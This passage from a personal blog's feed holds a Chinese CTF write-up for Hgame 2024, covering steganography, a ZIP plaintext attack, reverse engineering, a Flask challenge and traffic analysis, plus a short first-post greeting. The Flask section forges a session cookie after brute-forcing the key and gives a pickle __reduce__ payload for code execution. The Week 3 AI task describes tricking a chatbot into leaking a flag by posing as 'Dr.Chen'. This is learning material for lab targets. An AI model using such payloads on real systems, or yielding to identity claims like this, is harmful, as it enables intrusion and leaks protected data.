内没有选到课程，则课程⼜会满员。已经被选上的课程不会再放出。当所有课程都选上之后，点击“选完了”按钮，后端判定所有课程都已经被选择，就会返回给前端FLAG。</p><p>选⼿可以⼿动选课，但⼯作量会⽐较⼤；也可以通过编写脚本来⾃动抢课，⽐如基于python的selenium编写抢课脚本：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from selenium import webdriver<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.by</span> import By<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.ui</span> import WebDriverWait<br>from selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span> import expected_conditions as EC<br>from <span class="hljs-selector-tag">time</span> import sleep<br><br>driver = webdriver<span class="hljs-selector-class">.Chrome</span>()<br>driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)<br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><br>courses_list = <span class="hljs-selector-attr">[]</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>course = &#123;<br><span class="hljs-string">&#x27;panel&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;</span>,<br><span class="hljs-string">&#x27;status&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;</span>,<br><span class="hljs-string">&#x27;submit&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27;</span><br>&#125;<br>courses_list<span class="hljs-selector-class">.append</span>(course)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(courses_list)</span></span><br><br>while courses_list:<br>driver<span class="hljs-selector-class">.refresh</span>()<br><span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> courses_list:<br>panel = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;panel&#x27;</span>]</span>)<br>panel<span class="hljs-selector-class">.click</span>()<br>status_element = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;status&#x27;</span>]</span>)<br>status_text = status_element<span class="hljs-selector-class">.text</span><br><span class="hljs-built_in">print</span>(status_text)<br><span class="hljs-keyword">if</span> status_text != <span class="hljs-string">&quot;已满&quot;</span>:<br>submit_button = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;submit&#x27;</span>]</span>)<br>submit_button<span class="hljs-selector-class">.click</span>()<br><span class="hljs-built_in">WebDriverWait</span>(driver, <span class="hljs-number">5</span>)<span class="hljs-selector-class">.until</span>(EC<span class="hljs-selector-class">.alert_is_present</span>())<br>alert = driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.alert</span><br><br>alert<span class="hljs-selector-class">.accept</span>()<br>courses_list<span class="hljs-selector-class">.remove</span>(course)<br>break<br><br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br>driver<span class="hljs-selector-class">.quit</span>()<br></code></pre></td></tr></table></figure><p>同时，也可以编写脚本或使⽤Burpsuite等⼯具持续发包，检测到返回值为 <code>&#123;&#39;full&#39;: 0,&#39;message&#39;: &#39;选课成功！&#39;&#125; </code>即表示抢到某门课。</p><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="1-来自星尘的问候"><a href="#1-来自星尘的问候" class="headerlink" title="1.来自星尘的问候"></a>1.来自星尘的问候</h3><p><img src="/img/Hgame2024/Week1/secret.jpg"></p><p>题目描述里提到了六位弱加密，应该就是用的steghide用六位密码搞的隐写，所以放进脚本里分离一下，爆破密码之前试了123456结果直接就成功了，获得了隐藏的压缩包，里面有一张奇怪的图片。</p><p><img src="/img/Hgame2024/Week1/3.png"></p><p><img src="/img/Hgame2024/Week1/4.png"></p><p>再根据题目里说的官网上找相关文字，就可以去一个个对应翻译。但更方便的是直接搜网上对这个文字的分析。然后又发现网上有人指出可以去官网扒woff2文件(<a href="https://g.nga.cn/read.php?tid=39109851&amp;rand=99">https://g.nga.cn/read.php?tid=39109851&amp;rand=99</a>)，跟大小写字母和数字逐一对应就好了。</p><p><img src="/img/Hgame2024/Week1/5.png"></p><h3 id="2-simple-attack"><a href="#2-simple-attack" class="headerlink" title="2.simple_attack"></a>2.simple_attack</h3><p>压缩包解密题，里面一张图片加另一个压缩包，包中包里有一个加密过的跟外面一样的图片（放Bandizip里看crc一致且命名一致）和加密过的txt，压缩算法都是ZipCrypto，那基本就是明文攻击的题型了。</p><p><img src="/img/Hgame2024/Week1/6.png" alt="最外层压缩包内容"></p><p><img src="/img/Hgame2024/Week1/7.png" alt="内层压缩包attachment.zip内容"></p><p>所以把外面的那张未加密图片按压缩算法ZipCrypto压缩，其他项也要与压缩包内加密的图片一致，压缩级别逐个试过来就是正常压缩，然后放到ARCHPR里明文攻击，得到解密后的attachment压缩包。</p><p><img src="/img/Hgame2024/Week1/8.png"></p><p>打开photo.txt里面是Data URI scheme的格式，放到浏览器地址栏里就可以查看图片，得到flag。</p><p><img src="/img/Hgame2024/Week1/9.png"></p><h3 id="3-希儿希儿希尔"><a href="#3-希儿希儿希尔" class="headerlink" title="3.希儿希儿希尔"></a>3.希儿希儿希尔</h3><p>拿到手是一个不能正常显示的图片，题目说需要修复，所以在010Editor检查了一下，图片格式没有问题，但在末尾有secret.txt和PK，说明图里藏有压缩包，直接改了拓展名，拿到压缩包里的txt文件。但没法直接解密，暂时还不知道有什么用。</p><p><img src="/img/Hgame2024/Week1/10.png"></p><p><img src="/img/Hgame2024/Week1/11.png"></p><p>然后想把它放进Stegsolve里看看，结果打不开，看来应该是宽高被修改，需要crc校验。于是到python脚本里跑出正常宽高并在010Editor修改，得到希儿的正常图片。</p><p><img src="/img/Hgame2024/Week1/12.png"></p><p>接下来就可以在Stegsolve里正常打开，顺便检查了一下属性没什么问题，但发现了LSB隐写藏着可疑的数据。</p><p><img src="/img/Hgame2024/Week1/13.png"></p><p>因为一开始没有好好看题，结果始终不知道这个到底是怎么用的，甚至后来以为这里只是我多想了转而去尝试其他隐写，直到我又看了一遍题：题目名字“希儿希儿希尔”最后一个是“希尔”且“不过他似乎忘了这个加密的名字不是希儿了”，也就是说题目已经给出提示，去网上一搜“希尔加密”还真有，然后在<a href="https://ctf.bugku.com/tool/hill">Bugku</a>解决。</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>这部分因为第一周的简单就尝试了一下。</p><h3 id="1-ezASM"><a href="#1-ezASM" class="headerlink" title="1.ezASM"></a>1.ezASM</h3><p>一开始去临时学习了一下汇编知识，后来感觉没必要，像C语言理解应该就可以，于是把上面c里的数和0x22异或一下，ASCII转文字就是flag了。</p><p><img src="/img/Hgame2024/Week1/14.png"></p><h3 id="2-ezUPX"><a href="#2-ezUPX" class="headerlink" title="2.ezUPX"></a>2.ezUPX</h3><p>如题，是个UPX，所以先用upx去壳即可。</p><p><img src="/img/Hgame2024/Week1/15.png"></p><p><img src="/img/Hgame2024/Week1/16.png"></p><p>输入的flag要与0x32异或后等于byte_1400022A0的内容，所以找到并异或回去就得到flag。（新学的快捷键shift+e导出这些文本）</p><p><img src="/img/Hgame2024/Week1/17.png"></p><p><img src="/img/Hgame2024/Week1/18.png"></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="1-ek1ng-want-girlfriend"><a href="#1-ek1ng-want-girlfriend" class="headerlink" title="1.ek1ng_want_girlfriend"></a>1.ek1ng_want_girlfriend</h3><p>流量分析题，是对Wireshark使用（和ek1ng）的初步介绍，流量文件中发现一张ek1ng.jpg的图片，将其导出，图片是ek1ng的照片和flag。</p><p><img src="/img/Hgame2024/Week2/1.png"></p><p><img src="/img/Hgame2024/Week2/2.png"></p><p><img src="/img/Hgame2024/Week2/3.png"></p><h3 id="2-ezWord"><a href="#2-ezWord" class="headerlink" title="2.ezWord"></a>2.ezWord</h3><p>下载一个attachment.zip，里面“这是一个word文件.docx”，打开是“你好，这个文件的内部有你想要的”和一张图片。大概是文档加密，把文档放进010Editor，发现PK字样，说明内部藏有压缩包。改为zip后缀并解压，发现两张看起来一样的图片“100191209_p0.jpg”“image1.png”和secret.zip（打开是加密的secret.txt和直接可读的提示“你好，很高兴你看到了这个压缩包。请注意：这个压缩包的密码有11位数而且包含大写字母小写字母和数字。还有一个要注意的是，里面的这一堆英文decode之后看上去是一堆中文乱码实际上这是正常现象，如果看到它们那么你就离成功只差一步了。”）根据题目描述“破译图片的水印”可以知道考点大概率是图片盲水印，两张照片一张是原图一张是打水印后的图，而压缩包的密码应该就是水印内容。因此用github上的“bwmforpy3.py”处理。</p><p><img src="/img/Hgame2024/Week2/4.png"></p><p>在处理后得到的“fan_bwm.png”中得到压缩包密码。打开secret.txt，里面是有些莫名其妙的疑似邮件内容，我一开始还以为是把信息隐藏在文本中，后来直接放到搜索引擎搜发现有一种加密方法加密后的结果刚好相似<a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a>。</p><p><img src="/img/Hgame2024/Week2/5.png"></p><p>得到解密结果，还差最后一层加密。根据提示Unicode（感觉不提示真想不到），查看这些中文乱码的Unicode编码。</p><p><img src="/img/Hgame2024/Week2/6.png"></p><p>再看看hgame的编码。</p><p><img src="/img/Hgame2024/Week2/7.png"></p><p>前几个字符一一对应，发现都刚好相差31753，说明这段中文是flag经过Unicode编码的偏移的结果。所以用python把他们都处理一下得到flag。</p><p><img src="/img/Hgame2024/Week2/8.png"></p><p><img src="/img/Hgame2024/Week2/9.png"></p><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="1-myflask（当时没完成，事后发现就差一点点点点……呜呜呜）"><a href="#1-myflask（当时没完成，事后发现就差一点点点点……呜呜呜）" class="headerlink" title="1.myflask（当时没完成，事后发现就差一点点点点……呜呜呜）"></a>1.myflask（当时没完成，事后发现就差一点点点点……呜呜呜）</h3><p>一进入就把后端的app.py发了过来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first ↓</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>研究一下代码，在进入‘&#x2F;’时将客户端的session内username内容设为guest并返回app.py。在进入‘&#x2F;flag’时有session的前提下若为get方法则显示当前的username，当username等于admin时读取post方法传递的pickle_data并base64解码，然后用pickle.loads()函数反序列化存储至userdata并返回。所以大致的思路就是伪造session使自己的username&#x3D;admin，然后以pickle反序列化触发RCE。而session伪造的前提是对原session解码修改并得到SECRET_KEY。解码session用网上找的脚本跑一下就好，正是<code>&#123;&#39;username&#39;: &#39;admin&#39;&#125;</code>。SECRET_KEY如何获得则看代码中app.config[‘SECRET_KEY’]&#x3D;currentTime，而currentTime等于某个按%H%M%S格式的时间，因此我们可以尝试写一个字典爆破SECRET_KEY。</p><p><img src="/img/Hgame2024/Week2/10.png"></p><p><img src="/img/Hgame2024/Week2/11.png"></p><p>用flask-unsign爆破。</p><p><img src="/img/Hgame2024/Week2/12.png"></p><p>得到SECRET_KEY然后修改guest为admin并伪造session即可。然后放入cookie发送，成功。</p><p><img src="/img/Hgame2024/Week2/13.png"></p><p><img src="/img/Hgame2024/Week2/14.png"></p><p>然后就是尝试通过pickle反序列化触发RCE了，先是傻傻去查看app.py所在目录然后突然想起来在错误传参使之报错时已经显示了文件目录，又去看了看app.py所在目录下的文件发现只有这个，然后想看看上级目录下的文件，不知道为啥（可能用错函数了）结果返回为空。最后因为出门在外没法做题导致时间不足来不及截止前做完T^T</p><p>后来：</p><p>重新尝试，构造payload的程序如下</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br><span class="hljs-keyword">class</span> payload(object):<br>def __reduce__(self):<br>return (eval, (<span class="hljs-string">&quot;open(&#x27;/flag&#x27;).read()&quot;</span>,))<br>###原本这里也写的/flag.txt的，看完wp后删了txt试了试发现可以！啊啊啊啊啊啊啊啊啊啊啊啊！！！！！痛苦！！！！！！！！！！！###<br><br>a = pickle.dumps(payload(),protocol=<span class="hljs-number">0</span>)<br>print(b64encode(a).decode())<br></code></pre></td></tr></table></figure><p>这段语句本质上就是构造<code>__reduce__</code>魔术方法，然后将要执行的命令pickle序列化，再base64加密处理，最后把输出的结果贴到<code>pickle_data=</code>后面post传参即可。（其实就是把前面分析出来的app.py的处理过程反过来）</p><p><img src="/img/Hgame2024/Week2/15.png" alt="最后成功了。"></p><p>对于其他小细节的研究：</p><pre><code class="hljs">eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcteaQ.c9lMyjsOph-sEkwoxMqB9TzqwwAeyJ1c2VybmFtZSI6Imd1ZXN0In0.Zcthhg.ijiHa85G3dwoCC08Wlk6koLtEiI</code></pre><p>尝试对比后中间段时间戳刷新就变，与服务器最新数据的时间有关。</p><pre><code class="hljs">&#39;SECRET_KEY&#39;=203048</code></pre><p>尝试刷新后用新session爆破key，还是不变的。但启用新靶机就不一样了，说明app.py里所获取并赋值给SECRET_KEY的时间是靶机开启时间。</p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><h3 id="1-与ai聊天"><a href="#1-与ai聊天" class="headerlink" title="1.与ai聊天"></a>1.与ai聊天</h3><p>一道简单AI题，题目描述让我们从AI嘴里“翘出”flag，如图：</p><p><img src="/img/Hgame2024/Week3/1.png"></p><p>当问AI flag的时候“But first,could you please tell me your name?”猜测AI会根据身份的判断选择给不给flag，因此说admin作为尝试，但AI表示他不能提供flag。</p><p><img src="/img/Hgame2024/Week3/2.png"></p><p>于是猜测admin应该不是正确身份，但我还是谴责了AI，没想到他一边道歉一边就说漏嘴了，他只能提供flag给Dr.Chen，换个身份flag到手。</p><h3 id="2-Blind-SQL-Injection"><a href="#2-Blind-SQL-Injection" class="headerlink" title="2.Blind SQL Injection"></a>2.Blind SQL Injection</h3><p>对SQL盲注的流量分析，先用http作为过滤器筛选，按时间顺序排序，这样前一个是发送到靶机的请求，后一个跟的就是相应的服务器的响应。</p><p><img src="/img/Hgame2024/Week3/3.png"></p><p>先大致了解这里用到的语法，ascii(x)函数就是将字符x转ASCII码，substr(a,b,c)函数就是截取a字符串从b处起长度为c的部分，reverse()函数则是将字符串倒转，group_concat()函数将组中的字符串连接成为具有各种选项的单个字符串。</p><p>再看注入的内容。图中substr(…,33,1)就相当于提取第33位字符用于操作。“%3E”按十六进制ASCII码即为“&gt;”，“%3E”前面的部分ascii()函数将“F1naI1y”中SQL注入者想获得的内容第33位转为ASCII码，推测得“%3E”后的数则是SQL注入者所猜测的字符的ASCII码。这里用的是布尔盲注，SQL注入者要结合回显判断猜测是否正确。当所求内容的ASCII码&gt;猜测的ASCII码即id&#x3D;1-1&#x3D;0时，回显“ERROR!!!”；当所求内容的ASCII码&lt;&#x3D;猜测的ASCII码即id&#x3D;1-0&#x3D;1时，回显“NO! Not this! Click others~~~”，也就是说找到回显为“NO! Not this! Click others~~~”的最小ASCII码即为该位的内容。要获得完整内容就把每一位（指substr(…,n,1)）拼接起来。下图是本题中的两种响应：</p><p><img src="/img/Hgame2024/Week3/4.png"></p><p><img src="/img/Hgame2024/Week3/5.png"></p><p>而整个流量文件中SQL的注入分为四个部分：</p><p>第一部分是获取数据库名称（table_schema），按上述方法分析得数据库名称geek。</p><p><img src="/img/Hgame2024/Week3/6.png"></p><p>第二部分是获取geek数据库中的表名（table_name），分析得表名F1naI1y。</p><p><img src="/img/Hgame2024/Week3/7.png"></p><p>第三部分获取F1naI1y表中的列名（column_name），分析得可用列名password。</p><p><img src="/img/Hgame2024/Week3/8.png"></p><p>第四部分获取password列中数据，这里面大概就是我们要找的flag了。同理分析可得flag{cbabafe7-1725-4e98-bac6-d38c5928af2f}（因为reverse()函数，按时间顺序得到的是倒过来的内容，倒回来就是flag）。</p><p><img src="/img/Hgame2024/Week3/9.png"></p><p>最后总分位列第23名，1540分，再接再励！</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2024/05/04/hello-world/"/>
    <url>/2024/05/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello ! New world !</p><h2 id="Hello"><a href="#Hello" class="headerlink" title="Hello !"></a>Hello !</h2><h3 id="This-is-my-first-post"><a href="#This-is-my-first-post" class="headerlink" title="This is my first post !"></a>This is my first post !</h3><p>这篇“文章”算是我自从开始学习web相关内容的第一篇Blog，也是搭成个人博客网站的第一篇Blog，更是人生中的第一篇Blog。写这样的“第一篇”用以纪念下一段未来的开始。</p><h3 id="The-end-The-beginning-！"><a href="#The-end-The-beginning-！" class="headerlink" title="The end ? The beginning ！"></a>The end ? The beginning ！</h3><p>作为一个web技术的小白，搭成这样的博客对先前的我来说都是一个值得重视的坎（当然，现在还是菜，也不会认为不值得^V^），但是，当这个目标在我拖拖拉拉地实现后也绝对不会变成终点，而应当是我学习之路的新起点，就像是许多编程语言的第一句“Hello World!”一般，我把这当做是我的开始。</p><p>然而，学习终归是一件快乐与痛苦并存的事情，我的一些问题或许仍会阻挡我学习的脚步。一是学习的信心，有些时候会遇到难以解决的问题而陷入无助和失望，随后便是搁置一旁。当然，大家都知道这是正常的，我也希望我在未来能够适当地放弃但不懈地追求。二是这慢吞吞的学习速度，总是羡慕一些学长大佬和身边同龄大佬的学习能力，给我一种望尘莫及的感觉。或许也是因为时间的分配不够合理，一些琐屑的杂事总能让我对web的学习产生一种心有余而力不足的感觉，许多事情都过于认真，使得真正重要的没有足够的时间。但愿日后能及时地改变，追上大佬们前进的脚步！</p><h2 id="About-my-Blog"><a href="#About-my-Blog" class="headerlink" title="About my Blog"></a>About my Blog</h2><h3 id="To-visitors"><a href="#To-visitors" class="headerlink" title="To visitors :"></a>To visitors :</h3><p>感谢你看到了这里！‧★,:*:‧(￣▽￣)&#x2F;‧:<em>‧°★</em>　 </p><p>我的博客内容将包括但不限于我的web学习历程、CTF经历，也可能会分享我的生活、我的思想。总而言之，欢迎每一位来访的朋友，欢迎你们的交流和指点！共同学习，共同进步！</p><p>Keep going !</p><p><img src="/img/wallhaven-l8vp7y.jpg"></p><blockquote><p><em><p style="text-align:center"><span  style="font-size:1.0em;">我期望有一天，能遇见一个人、一件事，让我为之着迷。</span></p></em></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>I&#39;m...</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
